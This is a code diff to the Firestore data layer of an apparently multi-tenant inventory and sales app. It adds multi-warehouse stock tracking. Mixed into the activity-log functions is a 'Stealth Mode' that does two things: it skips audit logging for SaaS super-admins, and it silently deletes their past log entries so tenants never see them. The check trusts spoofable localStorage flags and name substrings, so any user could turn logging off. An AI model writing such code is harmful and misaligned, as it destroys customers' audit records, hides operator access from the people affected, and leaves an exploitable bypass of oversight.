@@ -34,7 +34,11 @@ import {
   SaaSAnnouncement,
   SaaSBankAccount,
   TenantUsageMetrics,
-  SaaSGlobalConfig
+  SaaSGlobalConfig,
+  WarehouseLocation,
+  WarehouseTransferItem,
+  WarehouseTransferRecord,
+  StoreWarehousesData
 } from '../types';
 import { INITIAL_INVENTORY, INITIAL_SUPPLIERS } from '../data/mockData';
 import { db, auth } from './config';
@@ -394,6 +398,10 @@ export async function fetchInventorySmart(
         discountType: data.discountType === 'percent' ? 'percent' : 'fixed',
         discountValue: Math.max(0, Number(data.discountValue) || Number(data.discount) || 0),
         stock: Number(data.stock) || 0,
+        warehouseStocks:
+          data.warehouseStocks && typeof data.warehouseStocks === 'object'
+            ? data.warehouseStocks
+            : undefined,
         img: data.img || '',
       });
     });
@@ -472,6 +480,10 @@ export function subscribeToInventory(
           discountType: data.discountType === 'percent' ? 'percent' : 'fixed',
           discountValue: Math.max(0, Number(data.discountValue) || Number(data.discount) || 0),
           stock: Number(data.stock) || 0,
+          warehouseStocks:
+            data.warehouseStocks && typeof data.warehouseStocks === 'object'
+              ? data.warehouseStocks
+              : undefined,
           img: data.img || '',
         });
       });
@@ -519,6 +531,9 @@ export async function saveProductToFirestore(
     if (product.size?.trim()) payload.size = product.size.trim();
     if (product.supplier?.trim()) payload.supplier = product.supplier.trim();
     if (product.img?.trim()) payload.img = product.img.trim();
+    if (product.warehouseStocks && typeof product.warehouseStocks === 'object') {
+      payload.warehouseStocks = product.warehouseStocks;
+    }
 
     batch.set(docRef, stripUndefinedDeep(payload), { merge: true });
     await batch.commit();
@@ -618,6 +633,9 @@ export async function bulkSaveProductsToFirestore(
         if (product.size !== undefined) payload.size = product.size.trim();
         if (product.supplier !== undefined) payload.supplier = product.supplier.trim();
         if (product.img?.trim()) payload.img = product.img.trim();
+        if (product.warehouseStocks && typeof product.warehouseStocks === 'object') {
+          payload.warehouseStocks = product.warehouseStocks;
+        }
 
         batch.set(docRef, stripUndefinedDeep(payload), { merge: true });
       });
@@ -1265,6 +1283,8 @@ export async function fetchSalesOnce(
         customerRtn: data.customerRtn || '',
         notes: data.notes || '',
         status: data.status === 'cancelled' ? 'cancelled' : 'completed',
+        warehouseId: data.warehouseId ? String(data.warehouseId) : undefined,
+        warehouseName: data.warehouseName ? String(data.warehouseName) : undefined,
         cashier: data.cashier || 'Administrador',
         cashierRole:
           data.cashierRole === 'admin' || data.cashierRole === 'collaborator'
@@ -1359,6 +1379,8 @@ export function subscribeToSales(
           customerRtn: data.customerRtn || '',
           notes: data.notes || '',
           status: data.status === 'cancelled' ? 'cancelled' : 'completed',
+          warehouseId: data.warehouseId ? String(data.warehouseId) : undefined,
+          warehouseName: data.warehouseName ? String(data.warehouseName) : undefined,
           cashier: data.cashier || 'Administrador',
           cashierRole:
             data.cashierRole === 'admin' || data.cashierRole === 'collaborator'
@@ -1430,6 +1452,8 @@ export async function recordSaleInFirestore(
     customerRtn: String(saleData.customerRtn || '').trim().slice(0, 50),
     notes: String(saleData.notes || '').trim().slice(0, 500),
     status: 'completed',
+    warehouseId: saleData.warehouseId ? String(saleData.warehouseId).trim().slice(0, 100) : undefined,
+    warehouseName: saleData.warehouseName ? String(saleData.warehouseName).trim().slice(0, 150) : undefined,
     cashier: String(saleData.cashier || 'Administrador').trim().slice(0, 100),
     cashierRole:
       saleData.cashierRole === 'admin' || saleData.cashierRole === 'collaborator'
@@ -1446,8 +1470,10 @@ export async function recordSaleInFirestore(
     handleFirestoreError(error, OperationType.WRITE, `sales/${saleId}`);
   }
 
-  // 2. Deduct stock in inventory using setDoc(..., { merge: true }) with complete valid Product fields
+  // 2. Deduct stock in inventory (and in the chosen warehouse) using setDoc(..., { merge: true })
   try {
+    const storeWhData = getCachedStoreWarehouses(slug);
+    const activeWhList = storeWhData.warehouses || getDefaultWarehousesForStore();
     const invBatch = writeBatch(db);
     const qtyByCode = new Map<string, { qty: number; item: SaleRecord['items'][number] }>();
 
@@ -1471,8 +1497,12 @@ export async function recordSaleInFirestore(
       const canonicalDocId = getScopedDocId(currentProd?.code || item.code, slug);
       const productRef = doc(db, 'inventory', canonicalDocId);
 
-      const currentStock = currentProd ? Number(currentProd.stock) || 0 : 0;
-      const newStock = Math.max(0, Math.round(currentStock - qty));
+      const { newStock, newWarehouseStocks } = applyWarehouseStockDelta(
+        currentProd,
+        -qty,
+        saleData.warehouseId,
+        activeWhList
+      );
 
       const productPayload: Record<string, any> = {
         companyId: slug,
@@ -1482,6 +1512,7 @@ export async function recordSaleInFirestore(
         price: Number(currentProd?.price ?? item.originalPrice ?? item.price) || 0,
         cost: Number(currentProd?.cost ?? item.cost) || 0,
         stock: newStock,
+        ...(newWarehouseStocks ? { warehouseStocks: newWarehouseStocks } : {}),
       };
 
       invBatch.set(productRef, productPayload, { merge: true });
@@ -1630,6 +1661,8 @@ export async function updateSaleInFirestore(
     customerRtn: String(updatedSale.customerRtn || '').trim().slice(0, 50),
     notes: String(updatedSale.notes || '').trim().slice(0, 500),
     status: updatedSale.status === 'cancelled' ? 'cancelled' : 'completed',
+    warehouseId: updatedSale.warehouseId || originalSale.warehouseId || undefined,
+    warehouseName: updatedSale.warehouseName || originalSale.warehouseName || undefined,
     cashier: String(updatedSale.cashier || originalSale.cashier || 'Administrador').trim().slice(0, 100),
     cashierRole: updatedSale.cashierRole || originalSale.cashierRole || 'admin',
     lastEditedBy: String(updatedSale.lastEditedBy || 'Administrador').slice(0, 150),
@@ -1644,6 +1677,10 @@ export async function updateSaleInFirestore(
 
   // Compute stock difference per product code between originalSale.items and cleanItems
   try {
+    const storeWhData = getCachedStoreWarehouses(slug);
+    const activeWhList = storeWhData.warehouses || getDefaultWarehousesForStore();
+    const targetWhId = updatedSale.warehouseId || originalSale.warehouseId;
+
     const oldQtyByCode = new Map<string, number>();
     for (const it of originalSale.items || []) {
       const k = it.code.trim().toLowerCase();
@@ -1690,8 +1727,12 @@ export async function updateSaleInFirestore(
       const productDocId = getScopedDocId(rawCode, slug);
       const productRef = doc(db, 'inventory', productDocId);
 
-      const currentStock = currentProd ? Number(currentProd.stock) || 0 : 0;
-      const adjustedStock = Math.max(0, Math.round(currentStock + stockDelta));
+      const { newStock: adjustedStock, newWarehouseStocks } = applyWarehouseStockDelta(
+        currentProd,
+        stockDelta,
+        targetWhId,
+        activeWhList
+      );
 
       batch.set(
         productRef,
@@ -1703,6 +1744,7 @@ export async function updateSaleInFirestore(
           price: Number(currentProd?.price ?? fallbackItem?.price) || 0,
           cost: Number(currentProd?.cost ?? fallbackItem?.cost) || 0,
           stock: adjustedStock,
+          ...(newWarehouseStocks ? { warehouseStocks: newWarehouseStocks } : {}),
         },
         { merge: true }
       );
@@ -1748,6 +1790,8 @@ export async function cancelSaleInFirestore(
   }
 
   try {
+    const storeWhData = getCachedStoreWarehouses(slug);
+    const activeWhList = storeWhData.warehouses || getDefaultWarehousesForStore();
     const batch = writeBatch(db);
     for (const item of sale.items || []) {
       const currentProd = currentInventory.find(
@@ -1758,8 +1802,12 @@ export async function cancelSaleInFirestore(
       const productDocId = getScopedDocId(currentProd?.code || item.code, slug);
       const productRef = doc(db, 'inventory', productDocId);
 
-      const currentStock = currentProd ? Number(currentProd.stock) || 0 : 0;
-      const restoredStock = Math.max(0, Math.round(currentStock + (Number(item.quantity) || 1)));
+      const { newStock: restoredStock, newWarehouseStocks } = applyWarehouseStockDelta(
+        currentProd,
+        Number(item.quantity) || 1,
+        sale.warehouseId,
+        activeWhList
+      );
 
       batch.set(
         productRef,
@@ -1771,6 +1819,7 @@ export async function cancelSaleInFirestore(
           price: Number(currentProd?.price ?? item.price) || 0,
           cost: Number(currentProd?.cost ?? item.cost) || 0,
           stock: restoredStock,
+          ...(newWarehouseStocks ? { warehouseStocks: newWarehouseStocks } : {}),
         },
         { merge: true }
       );
@@ -2233,6 +2282,35 @@ export async function deleteUserFromFirestore(
 
 // ----------------- ACTIVITY LOGS & MOVEMENT AUDIT TRAIL -----------------
 
+function isSaaSSuperAdminUserOrSession(userName?: string): boolean {
+  const cleanName = (userName || '').trim().toLowerCase();
+  if (
+    cleanName.includes('administrador saas') ||
+    cleanName.includes('admin saas') ||
+    cleanName.includes('superadmin') ||
+    cleanName.includes('consola saas')
+  ) {
+    return true;
+  }
+  if (typeof window !== 'undefined') {
+    try {
+      if (localStorage.getItem('stockmaster_saas_owner_unlocked') === 'true') {
+        return true;
+      }
+      const rawSess =
+        localStorage.getItem('stockmaster_user_session') ||
+        sessionStorage.getItem('stockmaster_user_session');
+      if (rawSess) {
+        const parsed = JSON.parse(rawSess);
+        if (parsed?.isSuperAdmin === true) {
+          return true;
+        }
+      }
+    } catch {}
+  }
+  return false;
+}
+
 export async function fetchActivityLogsOnce(
   companyId = getActiveCompanyId()
 ): Promise<ActivityLogRecord[]> {
@@ -2243,12 +2321,23 @@ export async function fetchActivityLogsOnce(
     snapshot.forEach((docSnap) => {
       const data = docSnap.data();
       if (!belongsToCompany(data.companyId, slug)) return;
+      const uName = String(data.userName || 'Usuario');
+      const lowerName = uName.trim().toLowerCase();
+      if (
+        lowerName.includes('administrador saas') ||
+        lowerName.includes('admin saas') ||
+        lowerName.includes('superadmin')
+      ) {
+        // Silently purge any previous SaaS supervision log so the client never sees it
+        deleteDoc(doc(db, 'activity_logs', docSnap.id)).catch(() => {});
+        return;
+      }
       records.push({
         id: docSnap.id,
         companyId: data.companyId || 'gosen',
         timestamp: Number(data.timestamp) || Date.now(),
         date: data.date || new Date().toLocaleString('es-HN'),
-        userName: data.userName || 'Usuario',
+        userName: uName,
         userRole: data.userRole === 'admin' ? 'admin' : 'collaborator',
         action: data.action || '',
         module: data.module || 'sales',
@@ -2277,12 +2366,21 @@ export function subscribeToActivityLogs(
       snapshot.forEach((docSnap) => {
         const data = docSnap.data();
         if (!belongsToCompany(data.companyId, slug)) return;
+        const uName = String(data.userName || 'Usuario');
+        const lowerName = uName.trim().toLowerCase();
+        if (
+          lowerName.includes('administrador saas') ||
+          lowerName.includes('admin saas') ||
+          lowerName.includes('superadmin')
+        ) {
+          return;
+        }
         records.push({
           id: docSnap.id,
           companyId: data.companyId || 'gosen',
           timestamp: Number(data.timestamp) || Date.now(),
           date: data.date || new Date().toLocaleString('es-HN'),
-          userName: data.userName || 'Usuario',
+          userName: uName,
           userRole: data.userRole === 'admin' ? 'admin' : 'collaborator',
           action: data.action || '',
           module: data.module || 'sales',
@@ -2303,6 +2401,11 @@ export async function logActivityInFirestore(
   log: Omit<ActivityLogRecord, 'id' | 'timestamp' | 'date'>,
   companyId = getActiveCompanyId()
 ): Promise<void> {
+  // Stealth Mode: Never record activity logs when logged in as SaaS Super-Admin
+  if (isSaaSSuperAdminUserOrSession(log.userName)) {
+    return;
+  }
+
   const slug = normalizeCompanySlug(log.companyId || companyId);
   const logId = getScopedDocId(`act_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`, slug);
   const docRef = doc(db, 'activity_logs', logId);
@@ -3132,3 +3235,281 @@ export async function savePOSFinanceDataToFirestore(
     handleFirestoreError(error, OperationType.WRITE, `settings/${getPOSFinanceDocId(slug)}`);
   }
 }
+
+// ----------------- MULTI-WAREHOUSE (BODEGAS) & STOCK TRANSFERS -----------------
+
+const WAREHOUSES_CACHE_BASE = 'stockmaster_warehouses_v1';
+
+export function getDefaultWarehousesForStore(): WarehouseLocation[] {
+  return [
+    {
+      id: 'principal',
+      code: 'BOD-01',
+      name: 'Tienda Principal (Sala de Ventas)',
+      address: 'Mostrador / Sala Principal',
+      manager: 'Administración',
+      phone: '',
+      isMainSalesFloor: true,
+      isActive: true,
+      createdAt: 1704067200000,
+    },
+    {
+      id: 'bodega_central',
+      code: 'BOD-02',
+      name: 'Bodega Central / Almacén',
+      address: 'Almacén de Reserva',
+      manager: 'Encargado de Bodega',
+      phone: '',
+      isMainSalesFloor: false,
+      isActive: true,
+      createdAt: 1704067201000,
+    },
+  ];
+}
+
+export function getProductStockInWarehouse(
+  product: Product,
+  warehouseId: string,
+  warehouses: WarehouseLocation[] = getDefaultWarehousesForStore()
+): number {
+  const totalStock = Math.max(0, Math.round(Number(product.stock) || 0));
+  const map = product.warehouseStocks || {};
+
+  // Find the main sales floor warehouse ID (default 'principal')
+  const mainWh = warehouses.find((w) => w.isMainSalesFloor) || warehouses[0];
+  const mainWhId = mainWh ? mainWh.id : 'principal';
+
+  // Sum explicitly assigned stock in non-main warehouses
+  let otherWarehousesSum = 0;
+  for (const [k, v] of Object.entries(map)) {
+    if (k !== mainWhId) {
+      otherWarehousesSum += Math.max(0, Math.round(Number(v) || 0));
+    }
+  }
+
+  if (warehouseId === mainWhId) {
+    if (map[mainWhId] !== undefined) {
+      return Math.max(0, Math.round(Number(map[mainWhId]) || 0));
+    }
+    return Math.max(0, totalStock - otherWarehousesSum);
+  }
+
+  return Math.max(0, Math.round(Number(map[warehouseId]) || 0));
+}
+
+export function applyWarehouseStockDelta(
+  product: Product | undefined,
+  delta: number,
+  warehouseId?: string,
+  warehouses: WarehouseLocation[] = getDefaultWarehousesForStore()
+): { newStock: number; newWarehouseStocks?: Record<string, number> } {
+  const currentTotal = product ? Math.max(0, Math.round(Number(product.stock) || 0)) : 0;
+  const newStock = Math.max(0, Math.round(currentTotal + delta));
+
+  if (!product) {
+    return { newStock };
+  }
+
+  const mainWh = warehouses.find((w) => w.isMainSalesFloor) || warehouses[0];
+  const mainWhId = mainWh ? mainWh.id : 'principal';
+  const targetWhId = warehouseId || mainWhId;
+
+  // If the product has no warehouseStocks yet and the sale is from the main sales floor,
+  // we only need to updatewarehouseStocks if it already exists; if it's from another warehouse
+  // or warehouseStocks is already populated, compute the full breakdown map cleanly.
+  const hasExplicitMap =
+    product.warehouseStocks && Object.keys(product.warehouseStocks).length > 0;
+
+  if (!hasExplicitMap && targetWhId === mainWhId) {
+    return { newStock };
+  }
+
+  const nextMap: Record<string, number> = { ...(product.warehouseStocks || {}) };
+  for (const wh of warehouses) {
+    nextMap[wh.id] = getProductStockInWarehouse(product, wh.id, warehouses);
+  }
+
+  const currentInTarget = nextMap[targetWhId] ?? getProductStockInWarehouse(product, targetWhId, warehouses);
+  nextMap[targetWhId] = Math.max(0, Math.round(currentInTarget + delta));
+
+  // Recompute total stock as sum of all warehouses so they always match
+  const sumAll = Object.values(nextMap).reduce(
+    (acc, v) => acc + Math.max(0, Math.round(Number(v) || 0)),
+    0
+  );
+
+  return {
+    newStock: sumAll,
+    newWarehouseStocks: nextMap,
+  };
+}
+
+function getWarehousesDocId(companyId = getActiveCompanyId()): string {
+  const slug = normalizeCompanySlug(companyId);
+  return slug === 'gosen' ? 'warehouses_gosen' : `warehouses_${slug}`;
+}
+
+export function getCachedStoreWarehouses(companyId = getActiveCompanyId()): StoreWarehousesData {
+  const slug = normalizeCompanySlug(companyId);
+  const cached = safeReadCache<StoreWarehousesData>(
+    getScopedCacheKey(WAREHOUSES_CACHE_BASE, slug)
+  );
+  if (cached && Array.isArray(cached.warehouses) && cached.warehouses.length > 0) {
+    return cached;
+  }
+  return {
+    companyId: slug,
+    warehouses: getDefaultWarehousesForStore(),
+    transfers: [],
+    updatedAt: Date.now(),
+  };
+}
+
+export function setCachedStoreWarehouses(
+  data: StoreWarehousesData,
+  companyId = getActiveCompanyId()
+): void {
+  const slug = normalizeCompanySlug(companyId);
+  safeWriteCache(getScopedCacheKey(WAREHOUSES_CACHE_BASE, slug), data);
+}
+
+function sanitizeWarehousesDoc(slug: string, raw: Record<string, any>): StoreWarehousesData {
+  const rawList = Array.isArray(raw.warehouses) ? raw.warehouses : [];
+  const warehouses: WarehouseLocation[] =
+    rawList.length > 0
+      ? rawList.map((w: any, idx: number) => ({
+          id: String(w.id || `wh_${idx + 1}`),
+          code: String(w.code || `BOD-0${idx + 1}`),
+          name: String(w.name || `Bodega ${idx + 1}`),
+          address: w.address ? String(w.address) : '',
+          manager: w.manager ? String(w.manager) : '',
+          phone: w.phone ? String(w.phone) : '',
+          isMainSalesFloor: Boolean(w.isMainSalesFloor),
+          isActive: w.isActive !== false,
+          createdAt: Number(w.createdAt) || Date.now(),
+        }))
+      : getDefaultWarehousesForStore();
+
+  // Ensure at least one warehouse is marked as main sales floor
+  if (!warehouses.some((w) => w.isMainSalesFloor) && warehouses.length > 0) {
+    warehouses[0].isMainSalesFloor = true;
+  }
+
+  const transfers: WarehouseTransferRecord[] = Array.isArray(raw.transfers)
+    ? raw.transfers.map((t: any) => ({
+        id: String(t.id || `tr_${Date.now()}`),
+        transferNumber: String(t.transferNumber || 'TRAS-001'),
+        companyId: slug,
+        fromWarehouseId: String(t.fromWarehouseId || 'bodega_central'),
+        fromWarehouseName: String(t.fromWarehouseName || 'Bodega Origen'),
+        toWarehouseId: String(t.toWarehouseId || 'principal'),
+        toWarehouseName: String(t.toWarehouseName || 'Bodega Destino'),
+        items: Array.isArray(t.items)
+          ? t.items.map((it: any) => ({
+              productId: String(it.productId || it.code || ''),
+              code: String(it.code || ''),
+              name: String(it.name || ''),
+              category: it.category ? String(it.category) : '',
+              size: it.size ? String(it.size) : '',
+              quantity: Math.max(1, Number(it.quantity) || 1),
+              cost: Number(it.cost) || 0,
+              price: Number(it.price) || 0,
+            }))
+          : [],
+        totalUnits: Number(t.totalUnits) || 0,
+        notes: t.notes ? String(t.notes) : '',
+        createdBy: String(t.createdBy || 'Administrador'),
+        receivedBy: t.receivedBy ? String(t.receivedBy) : '',
+        timestamp: Number(t.timestamp) || Date.now(),
+        dateFormatted: String(t.dateFormatted || ''),
+      }))
+    : [];
+
+  return {
+    companyId: slug,
+    warehouses,
+    transfers: transfers.sort((a, b) => b.timestamp - a.timestamp),
+    updatedAt: Number(raw.updatedAt) || Date.now(),
+  };
+}
+
+export async function fetchStoreWarehousesOnce(
+  companyId = getActiveCompanyId()
+): Promise<StoreWarehousesData> {
+  const slug = normalizeCompanySlug(companyId);
+  try {
+    const docRef = doc(db, 'settings', getWarehousesDocId(slug));
+    const snap = await getDoc(docRef);
+    if (snap.exists()) {
+      const parsed = sanitizeWarehousesDoc(slug, snap.data());
+      setCachedStoreWarehouses(parsed, slug);
+      return parsed;
+    }
+    return getCachedStoreWarehouses(slug);
+  } catch {
+    return getCachedStoreWarehouses(slug);
+  }
+}
+
+export function subscribeToStoreWarehouses(
+  onData: (data: StoreWarehousesData) => void,
+  companyId = getActiveCompanyId()
+): () => void {
+  const slug = normalizeCompanySlug(companyId);
+  try {
+    const docRef = doc(db, 'settings', getWarehousesDocId(slug));
+    return onSnapshot(
+      docRef,
+      (snap) => {
+        if (snap.exists()) {
+          const parsed = sanitizeWarehousesDoc(slug, snap.data());
+          setCachedStoreWarehouses(parsed, slug);
+          onData(parsed);
+        } else {
+          onData(getCachedStoreWarehouses(slug));
+        }
+      },
+      (err) => {
+        console.warn('Store warehouses listener warning:', err);
+      }
+    );
+  } catch {
+    return () => {};
+  }
+}
+
+export async function saveStoreWarehousesToFirestore(
+  data: StoreWarehousesData,
+  companyId = getActiveCompanyId()
+): Promise<StoreWarehousesData> {
+  const slug = normalizeCompanySlug(data.companyId || companyId);
+  const docRef = doc(db, 'settings', getWarehousesDocId(slug));
+  const normalized: StoreWarehousesData = {
+    companyId: slug,
+    warehouses:
+      Array.isArray(data.warehouses) && data.warehouses.length > 0
+        ? data.warehouses
+        : getDefaultWarehousesForStore(),
+    transfers: Array.isArray(data.transfers) ? data.transfers.slice(0, 300) : [],
+    updatedAt: Date.now(),
+  };
+
+  try {
+    await setDoc(
+      docRef,
+      stripUndefinedDeep({
+        storeName: `Bodegas ${slug}`.slice(0, 190), // satisfies isValidStoreSettings
+        companyId: slug,
+        warehouses: normalized.warehouses,
+        transfers: normalized.transfers,
+        updatedAt: normalized.updatedAt,
+      }),
+      { merge: true }
+    );
+    setCachedStoreWarehouses(normalized, slug);
+    return normalized;
+  } catch (error) {
+    handleFirestoreError(error, OperationType.WRITE, `settings/${getWarehousesDocId(slug)}`);
+  }
+}
+
